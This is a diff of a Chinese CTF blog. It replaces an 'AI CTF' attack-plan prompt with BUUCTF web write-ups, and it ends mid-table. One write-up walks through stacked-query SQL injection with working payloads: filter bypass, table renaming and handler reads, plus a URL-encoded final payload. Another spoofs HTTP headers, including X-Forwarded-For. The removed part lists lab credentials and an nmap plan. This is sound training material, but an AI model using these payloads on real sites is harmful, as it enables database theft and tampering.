@@ -5,10 +5,10 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 8.1.1">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon-128.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16.png">
+  <link rel="mask-icon" href="/images/favicon-128.png" color="#222">
 
 <link rel="stylesheet" href="/css/main.css">
 
@@ -185,7 +185,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://zhaochoudecat.github.io/2026/05/02/README/">
+    <link itemprop="mainEntityOfPage" href="https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/saber.jpg">
@@ -199,7 +199,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2026/05/02/README/" class="post-title-link" itemprop="url">AI CTF </a>
+            <a href="/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="post-title-link" itemprop="url">4-CTF SQL注入 - 随便注</a>
         </h2>
 
         <div class="post-meta">
@@ -216,8 +216,21 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-05-03 03:58:35" itemprop="dateModified" datetime="2026-05-03T03:58:35+08:00">2026-05-03</time>
+                <time title="修改时间：2026-05-03 16:27:53" itemprop="dateModified" datetime="2026-05-03T16:27:53+08:00">2026-05-03</time>
               </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/BUUCTF/" itemprop="url" rel="index"><span itemprop="name">BUUCTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/BUUCTF/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
+                </span>
+            </span>
 
           
 
@@ -230,66 +243,315 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="AI-CTF"><a href="#AI-CTF" class="headerlink" title="AI CTF"></a>AI CTF</h1><p>作为CTF专家，我将协助你攻破目标靶机并获取两个flag文件（user.txt和root.txt）。以下是详细的攻击方案：</p>
-<ol>
-<li>环境准备阶段：</li>
-</ol>
-<ul>
-<li>本地使用Mac OS环境作为主操作平台</li>
-<li>备用方案：通过sshpass连接远程Kali环境（IP: 192.168.43.157，用户名root，密码kali）</li>
-<li>确认靶机IP地址：192.168.43.133</li>
+          <h1 id="CTF-SQL注入-随便注"><a href="#CTF-SQL注入-随便注" class="headerlink" title="CTF SQL注入 - 随便注"></a>CTF SQL注入 - 随便注</h1><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><ul>
+<li><strong>题目名称</strong>: easy_sql &#x2F; 随便注</li>
+<li><strong>题目类型</strong>: SQL注入</li>
+<li><strong>题目URL</strong>: <a target="_blank" rel="noopener" href="http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/">http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/</a></li>
+<li><strong>FLAG</strong>: <code>flag{7acd36c9-1cbb-4e30-8ee5-339726d381d2}</code></li>
 </ul>
-<ol start="2">
-<li>初始信息收集：</li>
-</ol>
+<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>页面提示：”取材于某次真实环境渗透，只说一句话：开发和安全缺一不可”<br>页面注释：”sqlmap是没有灵魂的”</p>
+<hr>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="1-初步探测"><a href="#1-初步探测" class="headerlink" title="1. 初步探测"></a>1. 初步探测</h3><p>首先访问题目页面，发现是一个输入框，提示”姿势”，查看源码发现是GET请求，参数名为<code>inject</code>。</p>
+<p><strong>测试正常输入：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>返回结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-确认SQL注入"><a href="#2-确认SQL注入" class="headerlink" title="2. 确认SQL注入"></a>2. 确认SQL注入</h3><p><strong>测试单引号闭合：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>返回错误：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p><strong>结论</strong>：存在SQL注入，数据库是MariaDB。</p>
+<h3 id="3-检测过滤关键字"><a href="#3-检测过滤关键字" class="headerlink" title="3. 检测过滤关键字"></a>3. 检测过滤关键字</h3><p>尝试使用<code>union select</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;union select 1,2-- &quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+
+<p><strong>结论</strong>：<code>select|update|delete|drop|insert|where|.</code>等关键字被过滤。</p>
+<h3 id="4-堆叠查询探测"><a href="#4-堆叠查询探测" class="headerlink" title="4. 堆叠查询探测"></a>4. 堆叠查询探测</h3><p>由于关键字被过滤，尝试堆叠查询（多语句注入）：</p>
+<p><strong>查看所有数据库：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;show databases;-- &quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>返回结果包含以下数据库：</p>
 <ul>
-<li>使用nmap对靶机进行全端口扫描：<code>nmap -sV -p- 192.168.43.133</code></li>
-<li>识别开放的服务及其版本信息</li>
-<li>检查是否存在web服务，若有则进行目录扫描</li>
+<li>ctftraining</li>
+<li>information_schema</li>
+<li>mysql</li>
+<li>performance_schema</li>
+<li>supersqli  ← 可疑数据库</li>
+<li>test</li>
 </ul>
-<ol start="3">
-<li>攻击路径规划：</li>
-</ol>
+<h3 id="5-查看表结构"><a href="#5-查看表结构" class="headerlink" title="5. 查看表结构"></a>5. 查看表结构</h3><p><strong>查看ctftraining数据库的表：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;use ctftraining;show tables;-- &quot;</span></span><br></pre></td></tr></table></figure>
+<p>发现FLAG_TABLE，但字段默认值为”not_flag”，排除。</p>
+<p><strong>查看supersqli数据库的表：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;use supersqli;show tables;-- &quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现两个表：</p>
 <ul>
-<li>根据扫描结果选择最可能突破的攻击向量</li>
-<li>优先尝试常见漏洞：SQL注入、命令注入、文件包含等</li>
-<li>建立初步立足点获取user权限</li>
+<li><code>1919810931114514</code>  ← 数字命名的表，非常可疑</li>
+<li><code>words</code></li>
 </ul>
-<ol start="4">
-<li>权限提升阶段：</li>
+<h3 id="6-查看可疑表的结构"><a href="#6-查看可疑表的结构" class="headerlink" title="6. 查看可疑表的结构"></a>6. 查看可疑表的结构</h3><p><strong>查看words表结构：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;use supersqli;show columns from words;-- &quot;</span></span><br></pre></td></tr></table></figure>
+<p>结果：id(int), data(varchar)</p>
+<p><strong>查看数字表结构（注意反引号）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;use supersqli;show columns from \`1919810931114514\`;-- &quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>关键发现</strong>：该表有一个字段叫<code>flag</code>！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-绕过select过滤获取flag"><a href="#7-绕过select过滤获取flag" class="headerlink" title="7. 绕过select过滤获取flag"></a>7. 绕过select过滤获取flag</h3><p>由于<code>select</code>被过滤，尝试以下方法：</p>
+<h4 id="尝试1：预处理语句（失败）"><a href="#尝试1：预处理语句（失败）" class="headerlink" title="尝试1：预处理语句（失败）"></a>尝试1：预处理语句（失败）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;set @sql=CONCAT(&#x27;se&#x27;,&#x27;lect * from \`1919810931114514\`;&#x27;);prepare stmt from @sql;execute stmt;-- &quot;</span></span><br></pre></td></tr></table></figure>
+<p>返回过滤提示：<code>strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)</code></p>
+<h4 id="尝试2：重命名表（备选方案）"><a href="#尝试2：重命名表（备选方案）" class="headerlink" title="尝试2：重命名表（备选方案）"></a>尝试2：重命名表（备选方案）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;use supersqli;rename table words to words1;rename table \`1919810931114514\` to words;-- &quot;</span></span><br></pre></td></tr></table></figure>
+<p>可以执行成功，但没有直接返回数据。</p>
+<h4 id="尝试3：handler语句（成功！）"><a href="#尝试3：handler语句（成功！）" class="headerlink" title="尝试3：handler语句（成功！）"></a>尝试3：handler语句（成功！）</h4><p>MySQL&#x2F;MariaDB的<code>handler</code>语句可以直接读取表数据，无需使用select。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;use supersqli;handler \`1919810931114514\` open;handler \`1919810931114514\` read first;-- &quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>成功获取flag：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(42) &quot;flag&#123;7acd36c9-1cbb-4e30-8ee5-339726d381d2&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><h3 id="1-堆叠查询（Stacked-Queries）"><a href="#1-堆叠查询（Stacked-Queries）" class="headerlink" title="1. 堆叠查询（Stacked Queries）"></a>1. 堆叠查询（Stacked Queries）</h3><p>在SQL注入中，使用分号<code>;</code>分隔多个SQL语句，可以执行额外的查询。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show databases; --</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-MySQL-MariaDB-特殊表名处理"><a href="#2-MySQL-MariaDB-特殊表名处理" class="headerlink" title="2. MySQL&#x2F;MariaDB 特殊表名处理"></a>2. MySQL&#x2F;MariaDB 特殊表名处理</h3><p>当表名是数字或包含特殊字符时，需要用<strong>反引号</strong>包裹：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> columns <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-Handler语句"><a href="#3-Handler语句" class="headerlink" title="3. Handler语句"></a>3. Handler语句</h3><p>MySQL的<code>handler</code>语句提供了一种直接访问表存储引擎的接口，可以绕过SELECT关键字限制：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">handler table_name <span class="keyword">open</span>;      <span class="comment">-- 打开表</span></span><br><span class="line">handler table_name read <span class="keyword">first</span>; <span class="comment">-- 读取第一条记录</span></span><br><span class="line">handler table_name read next;  <span class="comment">-- 读取下一条记录</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-常用绕过技巧"><a href="#4-常用绕过技巧" class="headerlink" title="4. 常用绕过技巧"></a>4. 常用绕过技巧</h3><table>
+<thead>
+<tr>
+<th>过滤</th>
+<th>绕过方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>select</td>
+<td>handler语句、预编译语句、重命名表+alter字段</td>
+</tr>
+<tr>
+<td>set&#x2F;prepare</td>
+<td>concat+char编码、十六进制编码</td>
+</tr>
+<tr>
+<td>where</td>
+<td>HAVING、LIMIT OFFSET</td>
+</tr>
+</tbody></table>
+<h3 id="5-表重命名攻击"><a href="#5-表重命名攻击" class="headerlink" title="5. 表重命名攻击"></a>5. 表重命名攻击</h3><p>当原查询只返回特定字段时，可以将flag表重命名为原查询的表名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename <span class="keyword">table</span> words <span class="keyword">to</span> words1;</span><br><span class="line">rename <span class="keyword">table</span> `<span class="number">1919810931114514</span>` <span class="keyword">to</span> words;</span><br><span class="line"><span class="keyword">alter table</span> words change flag id <span class="type">varchar</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="完整Payload"><a href="#完整Payload" class="headerlink" title="完整Payload"></a>完整Payload</h2><p><strong>获取flag的最终payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;use supersqli;handler `1919810931114514` open;handler `1919810931114514` read first;-- </span><br></pre></td></tr></table></figure>
+
+<p>URL编码后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1%27%3Buse%20supersqli%3Bhandler%20%601919810931114514%60%20open%3Bhandler%20%601919810931114514%60%20read%20first%3B--%20</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="题目启示"><a href="#题目启示" class="headerlink" title="题目启示"></a>题目启示</h2><ol>
+<li><strong>开发和安全缺一不可</strong>：过滤了常见SQL关键字，但忽略了其他SQL语句（如handler）</li>
+<li><strong>sqlmap不是万能的</strong>：手工注入能发现自动化工具遗漏的漏洞点</li>
+<li><strong>堆叠查询的危险性</strong>：即使某些关键字被过滤，堆叠查询仍可能导致数据泄露</li>
 </ol>
-<ul>
-<li>通过本地漏洞枚举寻找提权机会</li>
-<li>检查SUID文件、cron jobs、错误配置等</li>
-<li>最终获取root权限</li>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/5-http/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/saber.jpg">
+      <meta itemprop="name" content="zhaochoudecat">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zhaochoudecat">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2026/05/02/BUUCTF/WEB/5-http/" class="post-title-link" itemprop="url">5-[极客大挑战 2019]Http</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-05-02 00:00:00" itemprop="dateCreated datePublished" datetime="2026-05-02T00:00:00+08:00">2026-05-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-05-03 16:27:56" itemprop="dateModified" datetime="2026-05-03T16:27:56+08:00">2026-05-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/BUUCTF/" itemprop="url" rel="index"><span itemprop="name">BUUCTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/BUUCTF/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>访问页面，发现是 Syclover 三叶草小组的宣传页面。页面HTML源码中隐藏了一个 <code>Secret.php</code> 链接，需要通过多层HTTP请求头的伪造来获取 flag。</p>
+<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><h3 id="Step-1-发现隐藏页面"><a href="#Step-1-发现隐藏页面" class="headerlink" title="Step 1: 发现隐藏页面"></a>Step 1: 发现隐藏页面</h3><p>查看首页 HTML 源码，发现隐藏的链接：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;border:none;cursor:default;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;return false&quot;</span> <span class="attr">href</span>=<span class="string">&quot;Secret.php&quot;</span>&gt;</span>氛围<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>用 <code>curl</code> 查看响应头确认服务器信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -I http://node5.buuoj.cn:29582/</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Apache/2.2.15 (CentOS)</span><br><span class="line">X-Powered-By: PHP/5.3.3</span><br></pre></td></tr></table></figure>
+
+<h3 id="Step-2-伪造-Referer-来源"><a href="#Step-2-伪造-Referer-来源" class="headerlink" title="Step 2: 伪造 Referer 来源"></a>Step 2: 伪造 Referer 来源</h3><p>访问 <code>Secret.php</code>，页面提示：</p>
+<blockquote>
+<p>It doesn’t come from ‘<a target="_blank" rel="noopener" href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a>‘</p>
+</blockquote>
+<p>说明需要设置 <code>Referer</code> 请求头为该 URL：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -e <span class="string">&quot;https://Sycsecret.buuoj.cn&quot;</span> http://node5.buuoj.cn:29582/Secret.php</span><br></pre></td></tr></table></figure>
+
+<p><code>-e</code> 参数用于设置 Referer 头。</p>
+<h3 id="Step-3-伪造-User-Agent-浏览器标识"><a href="#Step-3-伪造-User-Agent-浏览器标识" class="headerlink" title="Step 3: 伪造 User-Agent 浏览器标识"></a>Step 3: 伪造 User-Agent 浏览器标识</h3><p>加上 Referer 后，页面显示：</p>
+<blockquote>
+<p>Please use “Syclover” browser</p>
+</blockquote>
+<p>说明需要将 <code>User-Agent</code> 设置为 <code>Syclover</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -e <span class="string">&quot;https://Sycsecret.buuoj.cn&quot;</span> -A <span class="string">&quot;Syclover&quot;</span> http://node5.buuoj.cn:29582/Secret.php</span><br></pre></td></tr></table></figure>
+
+<p><code>-A</code> 参数用于设置 User-Agent 头。</p>
+<h3 id="Step-4-伪造本地访问来源-IP"><a href="#Step-4-伪造本地访问来源-IP" class="headerlink" title="Step 4: 伪造本地访问来源 IP"></a>Step 4: 伪造本地访问来源 IP</h3><p>加上浏览器标识后，页面显示：</p>
+<blockquote>
+<p>No!!! you can only read this locally!!!</p>
+</blockquote>
+<p>说明需要伪装成本地访问，使用 <code>X-Forwarded-For</code> 头将来源IP设为 <code>127.0.0.1</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -e <span class="string">&quot;https://Sycsecret.buuoj.cn&quot;</span> -A <span class="string">&quot;Syclover&quot;</span> -H <span class="string">&quot;X-Forwarded-For: 127.0.0.1&quot;</span> http://node5.buuoj.cn:29582/Secret.php</span><br></pre></td></tr></table></figure>
+
+<p><code>-H</code> 参数用于添加自定义请求头。</p>
+<h3 id="最终命令"><a href="#最终命令" class="headerlink" title="最终命令"></a>最终命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -s \</span><br><span class="line">  -e <span class="string">&quot;https://Sycsecret.buuoj.cn&quot;</span> \ <span class="comment">#伪造Http Referer 请求头，告诉服务器，当前请求是从哪个页面跳转过来的</span></span><br><span class="line">  -A <span class="string">&quot;Syclover&quot;</span> \                   <span class="comment">#请求头，客户端身份（如手机、浏览器、爬虫）</span></span><br><span class="line">  -H <span class="string">&quot;X-Forwarded-For: 127.0.0.1&quot;</span> \  <span class="comment"># -H手动自定义任意 HTTP 请求头,这里代表伪装客户端 IP 为本地</span></span><br><span class="line">  http://node5.buuoj.cn:29582/Secret.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ec8908c2-1dcb-40e8-99cf-b56fcbd8e1a8&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><h3 id="1-HTTP-请求头伪造"><a href="#1-HTTP-请求头伪造" class="headerlink" title="1. HTTP 请求头伪造"></a>1. HTTP 请求头伪造</h3><p>本题考察了三种常见的 HTTP 请求头伪造技术：</p>
+<table>
+<thead>
+<tr>
+<th>请求头</th>
+<th>作用</th>
+<th>curl 参数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Referer</code></td>
+<td>标识请求来源页面</td>
+<td><code>-e</code> &#x2F; <code>--referer</code></td>
+</tr>
+<tr>
+<td><code>User-Agent</code></td>
+<td>标识客户端浏览器类型</td>
+<td><code>-A</code> &#x2F; <code>--user-agent</code></td>
+</tr>
+<tr>
+<td><code>X-Forwarded-For</code></td>
+<td>标识请求的真实客户端IP（代理转发）</td>
+<td><code>-H</code> &#x2F; <code>--header</code></td>
+</tr>
+</tbody></table>
+<h3 id="2-X-Forwarded-For-XFF"><a href="#2-X-Forwarded-For-XFF" class="headerlink" title="2. X-Forwarded-For (XFF)"></a>2. X-Forwarded-For (XFF)</h3><ul>
+<li><code>X-Forwarded-For</code> 是一个 HTTP 扩展头，用于识别通过代理或负载均衡连接的客户端的原始IP地址</li>
+<li>在 PHP 中，<code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code> 可能被此头覆盖（取决于服务器配置），导致服务端认为请求来自伪造的地址</li>
+<li>类似伪装的头部还有：<code>X-Real-IP</code>、<code>Client-IP</code>、<code>X-Originating-IP</code> 等</li>
 </ul>
-<ol start="5">
-<li>Flag获取与验证：</li>
-</ol>
-<ul>
-<li>在用户目录查找并读取user.txt</li>
-<li>在root目录获取root.txt</li>
-<li>验证flag格式是否符合要求</li>
+<h3 id="3-服务端IP验证的安全问题"><a href="#3-服务端IP验证的安全问题" class="headerlink" title="3. 服务端IP验证的安全问题"></a>3. 服务端IP验证的安全问题</h3><ul>
+<li>许多应用通过检查 IP 地址来判断是否为本地&#x2F;内网访问</li>
+<li>如果有反向代理，后端需要注意从 <code>X-Forwarded-For</code> 中正确提取真实IP</li>
+<li>安全做法：只在信任的代理链中使用 X-Forwarded-For，否则应忽略该头</li>
 </ul>
-<ol start="6">
-<li>报告撰写要求：</li>
-</ol>
-<ul>
-<li>创建my_ftc文件夹存放WP文档</li>
-<li>详细记录每个攻击步骤及对应命令</li>
-<li>包含漏洞原理说明和截图证据</li>
-<li>使用中文撰写完整的渗透测试报告</li>
-<li>报告结构需包含：目标概述、信息收集、漏洞利用、权限提升、总结反思</li>
-</ul>
-<ol start="7">
-<li>协作方式：</li>
-</ol>
-<ul>
-<li>实时同步攻击进展</li>
-<li>遇到困难时共同分析解决方案</li>
-<li>每个关键步骤执行前进行确认</li>
-</ul>
-<p>请先执行初始信息收集步骤，我将根据扫描结果指导后续攻击策略。</p>
+<h3 id="4-curl-常用参数速查"><a href="#4-curl-常用参数速查" class="headerlink" title="4. curl 常用参数速查"></a>4. curl 常用参数速查</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-s</code></td>
+<td>静默模式，不显示进度</td>
+</tr>
+<tr>
+<td><code>-I</code></td>
+<td>只获取响应头（HEAD 请求）</td>
+</tr>
+<tr>
+<td><code>-e URL</code></td>
+<td>设置 Referer</td>
+</tr>
+<tr>
+<td><code>-A STR</code></td>
+<td>设置 User-Agent</td>
+</tr>
+<tr>
+<td><code>-H &quot;Key: Val&quot;</code></td>
